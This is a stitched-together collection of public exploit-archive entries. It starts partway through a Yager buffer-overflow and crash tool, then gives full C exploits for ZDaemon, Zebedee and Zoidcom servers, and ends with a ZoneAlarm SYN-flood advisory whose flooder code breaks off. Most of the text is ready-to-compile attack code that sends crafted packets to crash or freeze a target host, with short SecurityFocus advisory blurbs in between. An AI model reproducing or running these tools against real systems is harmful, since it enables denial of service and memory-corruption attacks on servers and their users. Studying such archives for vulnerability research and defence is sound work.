        "Yager <= 5.24 multiple vulnerabilities "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(auto)]\n"
            "\n"
            "Attacks:\n"
            " 1 = nickname buffer-overflow\n"
            " 2 = big data buffer-overflow\n"
            " 3 = freeze of server and connected clients\n"
            " 4 = crash using type 0x1d (in 0x0050e970)\n"
            " 5 = crash using type 0x22 (in 0x004fd2b8)\n"
            " 6 = crash using type 0x24 (in 0x004fd2f5)\n"
            " 7 = crash using type 0x28 (in 0x004b0f1b)\n"
            "\n", argv[0]);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 3) {
        autoport = 0;
        port = atoi(argv[3]);
    }

    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    if(autoport) {
        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd < 0) std_err();

        fputs("- request informations:\n", stdout);
        *(u_short *)(info + 19) = ~time(NULL);
        SENDTO(info);
        RECVFROM;
        close(sd);

        p = buff + 19;
        port = ntohs(*(u_short *)p);
        printf("\n  Server port   %d\n", port);
        p += 2;
        SHOW("  Map           ");
        printf("  Version       %d.%d\n", p[1], p[0]);
        p += 2;
        SHOW("  Server name   ");
        p += 4;
        printf("  Players       %d / %d\n\n", p[1], p[0]);

        peer.sin_port = htons(port);
    }

    attack = atoi(argv[1]);
    if(attack > 7) {
        fputs("\nError: you have chosen a wrong attack number\n\n", stdout);
        exit(1);
    }

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();

    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    yh = (struct yager_head *)buff;
    yh->pck1 = tmp = ~time(NULL) & 0xffff;
    yh->pck2 = 0;

    if(attack == 1) {
        yh->type = 0x1e;
        memcpy(buff + HEADSZ, NICKBOF, sizeof(NICKBOF) - 1);
        yh->size = sizeof(NICKBOF) - 1;
        fputs("- send long data block for nickname buffer-overflow\n", stdout);

    } else if(attack == 2) {
        yh->type = 0x00;    // almost any other type is ok
        memcpy(buff + HEADSZ, PCKBOF, sizeof(PCKBOF) - 1);
        yh->size = sizeof(PCKBOF) - 1;
        fputs("- send long data block for packet buffer-overflow\n", stdout);

    } else if(attack == 3) {
        yh->type = 0x1b;
        yh->size = 0;
        printf("- server waits for %d bytes but we send a partial header\n", HEADSZ);
        tmp %= HEADSZ;
        if(tmp <= 0) tmp = 1;
        SEND(buff, tmp);
        fputs("  Server and connected clients should be freezed, press RETURN to stop the attack\n", stdout);
        fgetc(stdin);
        close(sd);
        return(0);

    } else {
        if(attack == 4) {
            yh->type = 0x1d;
        } else if(attack == 5) {
            yh->type = 0x22;
        } else if(attack == 6) {
            yh->type = 0x24;
        } else if(attack == 7) {
            yh->type = 0x28;
        }

        memset(buff + HEADSZ, 0xff, CRASHSZ);
        yh->size = CRASHSZ;
        printf("- send crash data with type 0x%08lx\n", yh->type);
    }

    SEND(buff, yh->size + HEADSZ);
    fputs("- check server status\n", stdout);
    if(!timeout(sd)) {
        if(recv(sd, buff, BUFFSZ, 0) < 0) {
            fputs("\nServer IS vulnerable!!!\n\n", stdout);
        } else {
            fputs("\nServer doesn't seem vulnerable\n\n", stdout);
        }
    } else {
        fputs("\nNo reply from the server, it is probably not vulnerable\n\n", stdout);
    }

    close(sd);
    return(0);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2005-04-14]
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include "wad_md5.h"
#include "zd_huffman.c"
#include "zdaemon.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <sys/param.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define stristr strcasestr
    #define stricmp strcasecmp
    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        10666
#define BUFFSZ      8192
#define TWAIT       3
#define VERSION     108

#define PUT32(x,y)  *(u32 *)x = y; \
                    x += 4;



int addwad(u8 *data, u8 *wad, u8 *md5);
u8 **info_proto(u8 *data, int len, int *ver, int *wads);
void delimit(u8 *data);
int mycpy(u8 *dst, u8 *src);
int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int timeout(int sock, int sec);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  linger  ling = {1,1};
    struct  sockaddr_in peer;
    int     sd,
            i,
            len,
            wads        = 0,
            ver         = VERSION;
    u16     port        = PORT;
    u8      buff[BUFFSZ],
            huffbuff[BUFFSZ],
            password[128],
            **wad,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "ZDaemon <= 1.08.07 NULL pointer " VER "\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port    = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    printf("- query server:\n");
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    p = buff;
    PUT32(p, LAUNCHER_CHALLENGE);
    len = send_recv(sd, buff, p - buff, buff, sizeof(buff), &peer, 1);
    close(sd);
    wad = info_proto(buff, len, &ver, &wads);

    HuffInit();

    password[0] = 0;
    for(;;) {
        printf("- join the server\n");
        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd < 0) std_err();
        setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));

        p = buff;
        *p++ = 0xff;                            // no compression
        *p++ = CONNECT_CHALLENGE;               // cmd
        *p++ = ver;                             // version
        *p++ = 0;                               // level
        p   += mycpy(p, password);              // password
        *p++ = 1 + wads;                        // number of wads
        p   += addwad(p, "ZDAEMON.WAD", NULL);
        for(i = 0; i < wads; i++) {
            p += addwad(p, wad[i],      NULL);
        }

        len = send_recv(sd, buff, p - buff, buff, sizeof(buff), &peer, 1);
        HuffDecode(buff, huffbuff, len, &len);  // decompression

        if(huffbuff[0] == NETWORK_ERROR) {
            p = huffbuff + 1;
            goto error;
        } else if(huffbuff[5] == NETWORK_ERROR) {
            p = huffbuff + 6;
            goto error;
        }

        len = send_recv(sd, NULL, 0, buff, sizeof(buff), &peer, 0);
        if(len < 0) {
            printf(" socket timeout\n");
            break;
        }
        HuffDecode(buff, huffbuff, len, &len);  // decompression

        if((huffbuff[5] == NETWORK_ERROR) || (huffbuff[5] == sv_kick)) {
            p = huffbuff + 6;
            goto error;
        }
        break;
error:
        close(sd);
        if(stristr(p, "full")) {
            printf(" server full ");
            for(i = TWAIT; i; i--) {
                printf("%3d\b\b\b", i);
                sleep(ONESEC);
            }
        } else if(stristr(p, "password")) {
            if(!password[0]) {
                strcpy(password, "password");
            } else {
                printf("- server is protected with password, insert the keyword:\n  ");
                fgets(password, sizeof(password), stdin);
                delimit(password);
            }
        } else if(stristr(p, "banned")) {
            printf("\n"
                "Error: your IP is banned on this server:\n"
                "       %s\n", p);
            exit(1);
        } else {
            printf("\n"
                "Error: client has not been accepted:\n"
                "       %s\n", p);
            exit(1);
        }
    }

    printf("- send the bad packet\n");
    p = buff;
    *p++ = 0xff;    // no huffman
    *p++ = 6;
    send_recv(sd, buff, p - buff, NULL, 0, &peer, 0);
    sleep(ONESEC);
    close(sd);

    sleep(ONESEC);
    printf("- check server:\n");
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    p = buff;
    PUT32(p, LAUNCHER_CHALLENGE);
    if(send_recv(sd, buff, p - buff, buff, sizeof(buff), &peer, 0) < 0) {
        printf("\n  Server IS vulnerable!!!\n");
    } else {
        printf("\n  Server doesn't seem vulnerable\n");
    }
    close(sd);

    for(i = 0; i < wads; i++) free(wad[i]); // free everything
    free(wad);
    return(0);
}



int addwad(u8 *data, u8 *wad, u8 *md5) {
    int     i,
            tmp;
    u8      *p;

    p = data;

    if(!md5) {
        for(i = 0; wad_md5[i][0]; i++)  {
            if(!stricmp(wad, wad_md5[i][0])) {
                md5 = wad_md5[i][1];
                break;
            }
        }
        if(!md5) {
            printf("\n- %s not found in the MD5 database", wad);
            md5 = wad_md5[0][1];
        }
    }

    p += mycpy(p, wad);

    for(i = 0; i < 16; i++) {
        sscanf(md5, "%02x", &tmp);
        md5 += 2;
        *p++ = tmp;
    }

    return(p - data);
}



u8 **info_proto(u8 *data, int len, int *ver, int *wads) {
    int     i,
            num;
    u8      *limit,
            **wad;

    limit = data + len;
    printf("\n");
    printf("  Master ch  %d\n", *(u32 *)data);              data += 4;
    printf("  Hostname   %s\n", data);                      data += strlen(data) + 1;
    printf("  Players    %hhu/%hhu\n", data[0], data[1]);   data += 2;
    printf("  Mapname    %s\n", data);                      data += strlen(data) + 1;
    num = *data++;
    *wads = num + 1;
    wad = malloc(*wads * sizeof(char *));                   // +1 for Iwad too
    if(num) {
        printf("  Wads:\n");
        for(i = 0; i < num; i++) {
            wad[i] = strdup(data);
            printf("    %s ", data);                        data += strlen(data) + 1;
        }
        printf("\n");
    }
    printf("  Gametype   %hhu\n", *data++);
    printf("  Gamename   %s\n", data);                      data += strlen(data) + 1;
    wad[*wads - 1] = strdup(data);
    printf("  IWad       %s\n", data);                      data += strlen(data) + 1;
    printf("  Gameskill  %hhu\n", *data++);
    printf("  File path  %s\n", data);                      data += strlen(data) + 1;
    printf("  E-mail     %s\n", data);                      data += strlen(data) + 1;
    printf("  DMFlags    %u\n", *(u32 *)data);              data += 4;
    printf("  DMFlags2   %u\n", *(u32 *)data);              data += 4;
    num = *data++;
    if(num) {
        printf("  Players:\n");
        for(i = 0; i < num; i++) {
            printf("    %s ", data);                        data += strlen(data) + 1;
            printf("  %hu ", *(u16 *)data);                 data += 2;
            printf("  %hu", *(u16 *)data);                  data += 2;
            printf("  %hhu", *data++);
            printf("  %hu", *(u16 *)data);                  data += 2;
            printf("\n");
        }
    }

    *ver = *(u16 *)data;                                    data += 2;
    printf("  Version    %hu\n", *ver);
//    printf("  Ext info   %u\n", *(u32 *)data);           data += 4;
    data += 4;
    printf("  Password   %hhu\n", *data++);

    // come on, it's enough
    // that's all we need

    return(wad);
}



void delimit(u8 *data) {
    while(*data && (*data != '\n') && (*data != '\r')) data++;
    *data = 0;
}



int mycpy(u8 *dst, u8 *src) {
    u8      *p;

    for(p = dst; *src; src++, p++) {
        *p = *src;
    }
    *p++ = 0;
    return(p - dst);
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry = 2,
            len;

    if(in) {
        while(retry--) {
            //fputc('.', stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) goto quit;
            if(!out) return(0);
            if(!timeout(sd, 2)) break;
        }
    } else {
        if(timeout(sd, 3) < 0) retry = -1;
    }

    if(retry < 0) {
        if(!err) return(-1);
        printf("\nError: socket timeout, no reply received\n\n");
        exit(1);
    }

    //fputc('.', stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}




int timeout(int sock, int sec) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec  = sec;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*
Zdaemon huffman 0.1
by Luigi Auriemma
e-mail: aluigi@autistici.org
web:    aluigi.org

  source code from Doom (X-Doom/old Zdaemon code) with modified HuffFreq for Zdaemon

*/

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdarg.h>

#include <ctype.h>
#include <math.h>

#define MAX_UDP_PACKET  1400    // modify it if you want

int LastCompMessageSize = 0;

typedef struct
{
    struct huffnode_s *zero;
    struct huffnode_s *one;
    unsigned char val;
    float freq;
} huffnode_s, huffnode_t;

typedef struct
{
    unsigned int bits;
    int len;
} hufftab_t;
static huffnode_t *HuffTree=0;
static hufftab_t HuffLookup[256];

static float HuffFreq[256]=
{
    0.46947443, 0.03744229, 0.02009356, 0.00707818,
    0.00728153, 0.02111485, 0.00445556, 0.00229655,
    0.01265820, 0.00241106, 0.00299206, 0.00265591,
    0.00284209, 0.00339483, 0.00203944, 0.00192218,
    0.01423221, 0.00194756, 0.00250942, 0.00224109,
    0.00264493, 0.00185304, 0.00164660, 0.00135765,
    0.00238693, 0.00155698, 0.00132108, 0.00136161,
    0.00168719, 0.00133527, 0.00138385, 0.00133988,
    0.00255865, 0.00167663, 0.00142282, 0.00185067,
    0.00179926, 0.00132452, 0.00107309, 0.00524015,
    0.00246438, 0.00096060, 0.00734912, 0.00102914,
    0.00170869, 0.00128854, 0.00097614, 0.00113916,
    0.00186316, 0.01077324, 0.00102875, 0.00354735,
    0.00125545, 0.00114088, 0.00103111, 0.00132834,
    0.00206495, 0.00107727, 0.00099150, 0.00454583,
    0.00144284, 0.00102763, 0.00105168, 0.00117436,
    0.00197808, 0.00103239, 0.00325006, 0.00115212,
    0.00125261, 0.00100999, 0.00100125, 0.00112827,
    0.00129156, 0.00098112, 0.00095781, 0.00098035,
    0.00117501, 0.00103275, 0.00111885, 0.00110044,
    0.00820434, 0.00091584, 0.00098619, 0.00089814,
    0.00135214, 0.00088258, 0.00095421, 0.00088725,
    0.00213761, 0.00099426, 0.00102234, 0.00098324,
    0.00116107, 0.00090388, 0.00085447, 0.00094951,
    0.00157389, 0.00110302, 0.00089621, 0.00094432,
    0.00813035, 0.00961901, 0.00476472, 0.00097480,
    0.00135165, 0.00093732, 0.00086517, 0.00092980,
    0.00543320, 0.00116154, 0.00099676, 0.00192325,
    0.00154463, 0.00087127, 0.00106448, 0.00113199,
    0.00343841, 0.00469290, 0.00088090, 0.00102023,
    0.00131824, 0.00091547, 0.00088527, 0.00090882,
    0.00113292, 0.00088162, 0.00088137, 0.00112587,
    0.00328156, 0.00088004, 0.00102551, 0.00086177,
    0.00107408, 0.00116912, 0.00084356, 0.00081423,
    0.00125029, 0.00079219, 0.00079757, 0.00089434,
    0.00107415, 0.00083609, 0.00078779, 0.00084491,
    0.00148952, 0.00085361, 0.00079014, 0.00082267,
    0.00103773, 0.00083512, 0.00081632, 0.00081653,
    0.00123191, 0.00079775, 0.00080431, 0.00081823,
    0.00122765, 0.00080738, 0.00080918, 0.00084970,
    0.00235248, 0.00079080, 0.00078659, 0.00081687,
    0.00107209, 0.00078719, 0.00078745, 0.00097451,
    0.00122689, 0.00078703, 0.00079399, 0.00076628,
    0.00119746, 0.00076251, 0.00079380, 0.00086241,
    0.00132236, 0.00077717, 0.00087071, 0.00080988,
    0.00099657, 0.00075881, 0.00077917, 0.00080354,
    0.00112704, 0.00078615, 0.00078358, 0.00077879,
    0.00109891, 0.00095691, 0.00080671, 0.00079289,
    0.00244628, 0.00080076, 0.00075714, 0.00079463,
    0.00122710, 0.00075707, 0.00073999, 0.00079447,
    0.00113160, 0.00095707, 0.00075825, 0.00074562,
    0.00105562, 0.00075720, 0.00079450, 0.00360570,
    0.00135354, 0.00077605, 0.00076658, 0.00081708,
    0.00138878, 0.00079424, 0.00083277, 0.00076214,
    0.00117659, 0.00598942, 0.00082706, 0.00081629,
    0.00132374, 0.00075337, 0.00077039, 0.00113487,
    0.00163245, 0.00090353, 0.00086913, 0.00091947,
    0.00125829, 0.00079054, 0.00079913, 0.00082155,
    0.00124808, 0.00079468, 0.00126046, 0.00086568,
    0.00130345, 0.00104526, 0.00107681, 0.00118829,
    0.00178076, 0.00132801, 0.00150205, 0.00155763,
    0.00225596, 0.00221831, 0.00161586, 0.00166614,
    0.00217488, 0.00195445, 0.00243183, 0.00258366,
    0.00355952, 0.00450725, 0.00615087, 0.02669448
};

void I_FatalError (const char *error, ...)
{
    va_list argptr;
    va_start (argptr, error);
    vprintf (error, argptr);
    va_end (argptr);
    exit(-1);
}

static void FindTab(huffnode_t *tmp,int len,unsigned int bits)
{
    if(!tmp)
        I_FatalError("no huff node");
    if (tmp->zero)
    {
        if(!tmp->one)
            I_FatalError("no one in node");
        if(len>=32)
            I_FatalError("compression screwd");
        FindTab((huffnode_t *)tmp->zero,len+1,bits<<1);
        FindTab((huffnode_t *)tmp->one,len+1,(bits<<1)|1);
        return;
    }
    HuffLookup[tmp->val].len=len;
    HuffLookup[tmp->val].bits=bits;
}

static unsigned char Masks[8]=
{
    0x01,   0x02,   0x04,   0x08,
    0x10,   0x20,   0x40,   0x80
};

static void PutBit(unsigned char *buf,unsigned pos,unsigned bit)
{
    if (bit)
        buf[pos >> 3] |= Masks[pos & 7];
    else
        buf[pos >> 3] &= ~Masks[pos & 7];
}

static unsigned GetBit(unsigned char *buf,unsigned pos)
{
    return ( buf[pos >> 3] & Masks[pos & 7] );
}

static void BuildTree(float *freq)
{
    float min1,min2;
    int i,j,minat1,minat2;
    huffnode_t *work[256];
    huffnode_t *tmp;

    for (i=0;i<256;i++)
    {
        work[i]=(huffnode_s *)malloc(sizeof(huffnode_t));
        work[i]->val=(unsigned char)i;
        work[i]->freq=freq[i];
        work[i]->zero=0;
        work[i]->one=0;
        HuffLookup[i].len=0;
    }
    for (i=0;i<255;i++)
    {
        minat1=-1;
        minat2=-1;
        min1=1E30;
        min2=1E30;
        for (j=0;j<256;j++)
        {
            if (!work[j])
                continue;
            if (work[j]->freq<min1)
            {
                minat2=minat1;
                min2=min1;
                minat1=j;
                min1=work[j]->freq;
            }
            else if (work[j]->freq<min2)
            {
                minat2=j;
                min2=work[j]->freq;
            }
        }
        if (minat1<0)
            I_FatalError("minatl: %d",minat1);
        if (minat2<0)
            I_FatalError("minat2: %d",minat2);

        tmp = (huffnode_s *)malloc(sizeof(huffnode_t));
        tmp->zero=(void *)work[minat2];
        tmp->one=(void *)work[minat1];
        tmp->freq=work[minat2]->freq+work[minat1]->freq;
        tmp->val=0xff;
        work[minat1]=tmp;
        work[minat2]=0;
    }
    HuffTree=tmp;
    FindTab(HuffTree,0,0);
}

void HuffDecode(unsigned char *in,unsigned char *out,int inlen,int *outlen)
{
    int             bits,nbits;
    huffnode_t      *tmp;
    unsigned char   *pout, *plast;

    pout = out;
    plast = out + 8*(MAX_UDP_PACKET+32)-1;

    if (*in==0xff)
    {
        if (inlen>1)
            memcpy(out,in+1,inlen-1);
        *outlen = inlen-1;
        return;
    }

    nbits = (inlen-1)*8 - (int)(unsigned) *in++;
    for (bits=0;  bits<nbits;   )
    {
        tmp = HuffTree;
        do
        {
            tmp = (GetBit(in,bits)) ? (huffnode_s *)tmp->one : (huffnode_s *)tmp->zero;
            bits++;
        }
        while (tmp->zero);
        *pout++ = tmp->val;
        if (pout>=plast)
        {
            printf("HuffDecode: overflow\n");
            break;
        }
    }

    *outlen = (int)(pout - out);
}

void HuffEncode(unsigned char *in,unsigned char *out,int inlen,int *outlen)
{
    int i,j,bitat;
    unsigned int t;
    bitat=0;
    for (i=0;i<inlen;i++)
    {
        t=HuffLookup[in[i]].bits;
        for (j=0;j<HuffLookup[in[i]].len;j++)
        {
            PutBit(out+1,bitat+HuffLookup[in[i]].len-j-1,t&1);
            t>>=1;
        }
        bitat+=HuffLookup[in[i]].len;
    }
    *outlen=1+(bitat+7)/8;
    *out=8*((*outlen)-1)-bitat;
	if(*outlen >= inlen+1)
	{
		*out=0xff;
		memcpy(out+1,in,inlen);
		*outlen=inlen+1;
	}
}

void HuffInit(void)
{
    BuildTree(HuffFreq);
}

source: http://www.securityfocus.com/bid/14796/info

A remote denial of service vulnerability affects Zebedee. This issue is due to a failure of the application to properly handle exceptional network requests.

Specifically, Zebedee is unable to handle requests for connections that contain a zero for the requested destination port.

A remote attacker may leverage this issue to crash the affected application, denying service to legitimate users.

Zebedee version 2.4.1 is reported vulnerable to this issue; other versions may also be affected.

/*
        $ gcc -o mkZebedeeDoS mkZebedeeDoS.c
        $ ./mkZebedeeDoS > zebedeeDoS
        $ nc targethost port < zebedeeDoS
*/

#include <stdio.h>

int main (int argc, char **argv)
{

        int i, size;

        char data[] = {
        0x02, 0x01, // protocol version
        0x00, 0x00, // flags
        0x20, 0x00, // max message size
        0x00, 0x06, // compression info
        0x00, 0x00, // port request: value = 0x0
        0x00, 0x80, // key length
        0xff, 0xff, 0xff, 0xff, // key token
        0x0b, 0xd8, 0x30, 0xb3, 0x21, 0x9c, 0xa6, 0x74, // nonce value
        0x00, 0x00, 0x00, 0x00 // target host address
         };

        size = 28;
        for(i=0; i<size; i++){
                printf("%c", data[i]);
        }

        return 0;

}
source: http://www.securityfocus.com/bid/25326/info

The Zoidcom network library is prone to a denial of service vulnerability when handling malformed packets.

An attacker could exploit this to crash a network service that is implemented with the library. 

/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
#endif



#define VER         "0.1"
#define PORT        8899

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
  struct  sockaddr_in peer;
  int     sd,
    i;
  u16     port    = PORT;
  u8      buff[16];

#ifdef WIN32
  WSADATA    wsadata;
  WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

  setbuf(stdout, NULL);

  fputs("\n"
        "Zoidcom <= 0.6.7 crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

  if(argc < 2) {
    printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
	   "\n", argv[0], port);
    exit(1);
  }

  if(argc > 2) port = atoi(argv[2]);
  peer.sin_addr.s_addr = resolv(argv[1]);
  peer.sin_port        = htons(port);
  peer.sin_family      = AF_INET;

  printf("- target   %s : %hu\n",
	 inet_ntoa(peer.sin_addr), port);

  sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if(sd < 0) std_err();

  // the following is a classical join packet
  memcpy(buff,
	 "\xec\x03\x00\x00\x00\x68\xc0\xff\xe9\x00\x80\x07\x00\x64\x00\x01", 16);

  buff[8] = 0x69;
  printf("- send malicious packet 0x%02x\n", buff[8]);
  for(i = 0; i < 2; i++) {
    if(sendto(sd, buff, 16, 0, (struct sockaddr *)&peer, sizeof(peer))
       < 0) std_err();
    sleep(0);
  }

  sleep(ONESEC);

  buff[8] = 0xa9;
  printf("- send malicious packet 0x%02x\n", buff[8]);
  for(i = 0; i < 2; i++) {
    if(sendto(sd, buff, 16, 0, (struct sockaddr *)&peer, sizeof(peer))
       < 0) std_err();
    sleep(0);
  }

  close(sd);

  printf("- the server should have been crashed, check it
  manually\n");
  return(0);
}



u32 resolv(char *host) {
  struct  hostent *hp;
  u32     host_ip;

  host_ip = inet_addr(host);
  if(host_ip == INADDR_NONE) {
    hp = gethostbyname(host);
    if(!hp) {
      printf("\nError: Unable to resolv hostname (%s)\n", host);
      exit(1);
    } else host_ip = *(u32 *)hp->h_addr;
  }
  return(host_ip);
}



#ifndef WIN32
void std_err(void) {
  perror("\nError");
  exit(1);
}
#endif

source: http://www.securityfocus.com/bid/5975/info

ZoneAlarm is a firewall software package designed for Microsoft Windows operating systems. It is distributed and maintained by Zone Labs.

ZoneAlarm does not properly handle some types of traffic. When ZoneAlarm is configured to block all traffic, and a Syn flood of 300 or more packets is sent to a host running the vulnerable software, the system becomes unstable. This problem has been reported as leading to a denial of service condition. 

/*
Start Advisory
NSSI Technologies Inc Research Labs Security Advisory 
http://www.nssolution.com (Philippines / .ph) 
"Maximum e-security" 
http://nssilabs.nssolution.com
ZoneAlarm Pro 3.1 and 3.0 Denial of Service Vulnerability
Author: Abraham Lincoln Hao / SunNinja
e-Mail: abraham@nssolution.com / SunNinja@Scientist.com
Advisory Code: NSSI-2002-zonealarm3 
Tested: Under Win2k Advance Server with SP3 / WinNT 4.0 with SP6a / Win2K Professional / WinNT 4.0 workstation 
Vendor Status:  Zone Labs is already contacted 1 month ago and they informed me that they going to release an update or new version to patched the problem. 
This vulnerability is confirmed by the vendor.
Vendors website: http://www.zonelabs.com
Severity: High

Overview:

New ZoneAlarm� Pro delivers twice the securityZone Labs award-winning, personal firewall trusted by millions, plus advanced privacy features. 
the award-winning PC firewall that blocks intrusion attempts and protects against Internet-borne threats like worms, Trojan horses, and spyware.   
ZoneAlarm Pro 3.1 and 3.0  doubles your protection with enhanced Ad Blocking and expanded Cookie Control to speed up your Internet experience and stop 
Web site spying. Get protected. Compatible with Microsoft� Windows� 98/Me/NT/2000 and XP.    
ZoneAlarm Pro 3.1.291 and 3.0  contains vulnerability that would let the attacker consume all your CPU and Memory usage that would result to Denial of 
Service Attack through sending  multiple syn packets / synflooding.  

Details:

Zone-Labs ZoneAlarm Pro 3.1.291 and 3.0 contains a vulnerability that would let the attacker consume all your CPU and Memory usage that would result to 
Denial of Service Attack through Synflooding that would cause the machine to stop from responding. Zone-Labs ZoneAlarm Pro 3.1.291 and 3.0 is also vulnerable 
with IP Spoofing. This Vulnerabilities are confirmed from the vendor.

Test diagram:
[*Nix b0x with IP Spoofing scanner / Flooder] <===[10/100mbps switch===> [Host with ZoneAlarm] 
 1] Tested under default install of the 2 versions after sending minimum of 300 Syn Packets to port 1-1024 the machine will hang-up until the attack stopped.
2] We configured the ZoneAlarm firewall both version to BLOCK ALL traffic setting after sending a minimum of 300 Syn Packets to port  1-1024 the machine will
hang-up until the attack stopped. 

Workaround:
Disable ZoneAlarm and Hardened TCP/IP stack of your windows and Install latest Security patch.
Note: To people who's having problem reproducing the vulnerability let me know :)
Any Questions? Suggestions? or Comments? let us know. 
e-mail: nssilabs@nssolution.com / abraham@nssolution.com / infosec@nssolution.com
greetings:
nssilabs team, especially to b45h3r and rj45, Most skilled and pioneers of NSSI good luck!. 
(mike@nssolution.com / aaron@nssolution.com),  Lawless the saint ;), dig0, p1x3l, dc and most of all to my Lorie.  
 
End Advisory

L-zonealarm.c compile with gcc l-zonealarm.c -o l-zonealarm
greets        Valk , harada ,bono-sad , my family .
email         lupsyn@mojodo.it
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <strings.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>

#define MAX_CHILDREN            30

void die(char *msg)
{
        perror(msg);
        exit(errno);
}


void usage()
{
	fprintf(stdout,"\n[************************************]\n"
		  "[*] Zone Alarm dos coded by lupsyn [*]\n"
                  "[*] Usage ./l-za srcIP dstIP port  [*]\n"
                  "[************************************]\n\n");
	exit(0);
}



u_short in_cksum(u_short *addr, int len)    /* function is from ping.c */
{ 
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer =0;
   
    while (nleft > 1) 
       	{
       	sum += *w++;
       	nleft -= 2;
      	}
    if (nleft == 1) 
     	{      
       	*(u_char *)(&answer) = *(u_char *)w;
        sum += answer;
     	}
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return(answer);
}


u_long getaddr(char *hostname)    
